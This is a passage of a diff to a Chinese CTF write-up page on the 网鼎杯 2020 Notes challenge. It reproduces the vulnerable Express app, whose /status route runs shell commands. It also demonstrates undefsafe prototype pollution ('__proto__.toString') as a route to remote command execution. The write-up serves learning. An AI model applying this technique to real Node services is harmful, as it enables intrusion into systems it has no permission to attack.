<span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure>
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154907.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="clown"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"/><span class="site-name">clown</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Nssctf刷题-网鼎杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-20T08:35:09.000Z" title="发表于 2024-03-20 16:35:09">2024-03-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-28T09:35:27.398Z" title="更新于 2024-03-28 17:35:27">2024-03-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Nssctf刷题-网鼎杯"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1><span id="网鼎杯-2020青龙组notes">[网鼎杯 2020青龙组]Notes</span></h1><p>这里没给题目源码只能网上找，app.js源码如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure>
 
 <p>大概审了一遍之后就会知道，在&#x2F;status路由里面执行了命令，只要能够污染commands里面的属性就能rce，接下来就要去看看怎么样才能污染这个属性。</p>
 <p>看了一下只有undefsafe这个模块能够修改对象的属性，搜了一下该模块在低版本存在原型链污染漏洞，先来了解一下undefsafe模块</p>
@@ -432,134 +162,76 @@
 <p><code>undefsafe</code> 是一个用于安全地访问对象属性的库。它提供了一种安全的方法来访问嵌套在对象中的属性，而不会导致错误。这在处理可能不存在的属性时非常有用，因为它可以避免抛出异常，但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞。</p>
 </blockquote>
 <p>下面是几个例子：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure>
 
 <p>下面是一个原型链污染的例子：</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure>
 
 <p>这时候toString属性就被我们修改了，那么根据上面的代码他会将commands对象所有的属性列出来，那么我们就可以利用原型链添加一个我们想要的属性值即可。</p>
 <p>能让我们足够自由传参数的污染的函数就是edit_note()</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>调用了该函数的位置就在&#x2F;edit_note路由</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span 